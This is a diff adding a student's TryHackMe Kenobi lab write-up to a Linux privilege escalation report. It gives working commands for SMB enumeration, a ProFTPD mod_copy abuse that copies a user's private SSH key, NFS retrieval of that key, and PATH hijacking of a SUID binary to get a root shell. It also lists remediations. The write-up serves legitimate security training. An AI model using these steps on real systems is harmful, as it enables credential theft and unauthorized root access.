@@ -1,3 +1,5 @@
+                                                Assignment: Linux Privilege Escalation and Kenobi Lab Report
+
 # 🐧 Linux Privilege Escalation Lab (TryHackMe)
 
 A hands-on security audit and privilege escalation exercise on a Linux target machine.  
@@ -123,3 +125,186 @@ Using the `-g` flag during compilation helped troubleshoot library behavior and 
 ---
 
 > ⚠️ *For educational and authorized lab environments only.*
+
+
+
+
+
+# 🔫 Kenobi – System Auditing & Lateral Movement (TryHackMe)
+
+A full-stack security assessment of the Kenobi Linux environment, focusing on service misconfigurations, insecure network file sharing, and SUID-based privilege escalation.
+
+---
+
+## 🛡️ Objective
+
+Identify and exploit chained vulnerabilities across SMB, FTP, NFS, and SUID misconfigurations to achieve full root access on the target system.
+
+---
+
+## 🔎 Phase 1: Network Reconnaissance & Enumeration
+
+The engagement began with an intensive Nmap sweep to map the attack surface.
+
+### Findings
+
+| Service | Version / Detail | Notes |
+|---|---|---|
+| FTP | ProFTPD 1.3.5 | Critical vulnerability found |
+| SSH | OpenSSH | Used for initial access |
+| HTTP | Apache | Web surface |
+| SMB | Samba | Anonymous share exposed |
+
+### SMB Analysis
+
+- Leveraged `nmap` scripts and `smbclient` to enumerate network shares
+- Discovered an `/anonymous` share with publicly readable files
+- Manually inspected server log files to **map the internal file structure** of the target
+
+```bash
+# SMB enumeration
+nmap -p 445 --script=smb-enum-shares,smb-enum-users <target-ip>
+smbclient //<target-ip>/anonymous
+```
+
+---
+
+## 💾 Phase 2: Vulnerability Research (ProFTPD 1.3.5)
+
+Focused research on ProFTPD version 1.3.5 revealed a critical flaw in the `mod_copy` module.
+
+### The Exploit — `mod_copy` Abuse
+
+The `mod_copy` module allows unauthenticated users to copy files on the server using two commands:
+
+| Command | Function |
+|---|---|
+| `CPFR` | Copy From — specify source path |
+| `CPTO` | Copy To — specify destination path |
+
+### The Pivot
+
+By chaining these commands, the user's **private SSH key** (`id_rsa`) was moved from a restricted home directory to a world-readable location:
+
+```bash
+CPFR /home/kenobi/.ssh/id_rsa
+CPTO /var/tmp/id_rsa
+```
+
+> 🔑 The key was now accessible without any authentication.
+
+---
+
+## 🚀 Phase 3: Initial Access via NFS Mounting
+
+With the SSH key relocated, NFS (Network File System) was used to mount the remote directory locally.
+
+### Steps
+
+```bash
+# Mount the remote NFS share
+sudo mount <target-ip>:/var/tmp /mnt/kenobiNFS
+
+# Retrieve the SSH key
+cp /mnt/kenobiNFS/id_rsa ~/.ssh/
+chmod 600 id_rsa
+
+# Connect as kenobi
+ssh -i id_rsa kenobi@<target-ip>
+```
+
+✅ Stable SSH session established as user `kenobi`.
+
+---
+
+## ⚡ Phase 4: Privilege Escalation — PATH Hijacking via SUID Binary
+
+Post-exploitation involved a systematic audit to identify escalation vectors.
+
+### SUID Binary Search
+
+```bash
+find / -perm -u=s -type f 2>/dev/null
+```
+
+### The Finding
+
+A **non-standard SUID binary** was discovered that called system utilities (e.g., `curl`, `status`) using **relative paths** instead of absolute paths like `/usr/bin/curl`.
+
+### The Exploit — PATH Manipulation
+
+```bash
+# Create a malicious script named after the called binary
+echo '/bin/bash' > /tmp/curl
+chmod +x /tmp/curl
+
+# Prepend /tmp to PATH so our script is found first
+export PATH=/tmp:$PATH
+
+# Execute the vulnerable SUID binary
+/usr/local/bin/<vulnerable-binary>
+```
+
+🎯 **Result: Root shell obtained.**
+
+---
+
+## 📈 Key Takeaways
+
+### 1. 🔗 Vulnerability Chaining
+> A low-severity SMB share leak provided the internal file path needed to execute a high-severity FTP exploit — neither vulnerability alone would have been sufficient.
+
+### 2.  Relative Path Danger
+> Custom Linux automation scripts that call binaries without absolute paths are vulnerable to PATH hijacking — a common mistake in real-world environments.
+
+---
+
+## 🔒 Security Recommendations
+
+- ✅ Disable `mod_copy` in ProFTPD or restrict it to authenticated users
+- ✅ Restrict NFS exports with `root_squash` and IP whitelisting
+- ✅ Audit all SUID binaries — remove unnecessary ones
+- ✅ Always use **absolute paths** in scripts and system binaries
+- ✅ Restrict anonymous SMB share access
+
+---
+
+## 🏁 Final Result
+
+- ✔️ Full network enumeration completed  
+- ✔️ ProFTPD `mod_copy` exploit executed  
+- ✔️ SSH key extracted via NFS  
+- ✔️ Root shell obtained via PATH hijacking  
+
+---
+
+## 📸 Screenshots
+
+<img src="images/kenobi_recon.png" width="800" alt="Reconnaissance">
+<img src="images/kenobi_exploit.png" width="800" alt="FTP Exploit">
+<img src="images/kenobi_root.png" width="800" alt="Root Shell">
+
+---
+
+> ⚠️ *For educational and authorized lab environments only.*
+
+
+
+Lab 2  Kenobi Room (TryHackMe)
+
+This lab was a full security assessment of a Linux machine where I learned how to combine multiple small weaknesses (SMB, FTP, NFS, SUID misconfigs) to eventually gain root access.
+
+I started with network scanning and service enumeration using Nmap and discovered exposed services like FTP (ProFTPD 1.3.5), SMB shares, SSH, and Apache. The SMB share allowed anonymous access, which helped me explore internal files and understand the system structure.
+
+Next, I researched the FTP service and found a vulnerability in ProFTPD 1.3.5 related to the mod_copy feature. This allowed file copying on the server without authentication, so I used it to move the user’s SSH private key (id_rsa) into a readable location.
+
+After that, I accessed the key through an NFS-mounted directory, fixed permissions, and logged in via SSH as the user kenobi.
+
+Finally, I looked for privilege escalation paths and found a SUID binary that used relative paths. I exploited this using PATH hijacking by creating a malicious executable in /tmp, which was executed with elevated privileges, giving me a root shell.
+
+Overall, I learned how small misconfigurations across different services can be chained together to fully compromise a system—from enumeration to root access.
+
+
+<img src="images/kenobi_recon.png" width="800" alt="Reconnaissance">
+<img src="images/kenobi_exploit.png" width="800" alt="FTP Exploit">
+<img src="images/kenobi_root.png" width="800" alt="Root Shell">
